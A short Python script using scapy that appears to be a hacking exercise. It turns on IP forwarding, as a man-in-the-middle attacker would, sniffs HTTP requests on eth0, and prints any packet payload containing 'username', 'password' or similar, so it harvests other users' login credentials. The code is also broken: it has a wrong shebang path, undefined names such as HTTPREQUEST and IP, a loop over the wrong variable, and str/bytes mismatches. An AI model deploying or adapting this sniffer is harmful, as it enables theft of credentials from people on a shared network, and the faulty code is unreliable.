#!/bin/usr/env python3

import scapy.all as sc
import os
from scapy.layers.http import HTTPRequest

#filters might be: arp, udp, tcp, port 21, port 80 etc
def sniff(interface):
    sc.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPREQUEST].Host.decode() + packet[HTTPREQUEST].Path.decode()
        #get the requester's IP
        ip = packet[IP].src
        print(f"\n[+] {ip} Requested {url}")
        log_info = get_login_info(packet)
        if log_info:
            print(f"\n\n[+] Password / username {log_info}\n\n")


def get_login_info(packet):
    if packet.haslayer(sc.Raw):
        load = packet[sc.Raw].load
        keywords = ["username", "user", "password", "pass"]
        for keyword in keyword:
            if keyword in load:
                return load

def ip_forwarding(enabled):
    if enabled:
        print("\nEnabling IP forwarding...")
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        print("Sleeping 5 sec ...")
        os.system('sleep 5')
    else:
        print("\nDisabling IP forwarding...")
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        print("Sleeping 5 sec ...")
        os.system('sleep 5')

ip_forwarding(True)
sniff("eth0")
ip_forwarding(False)



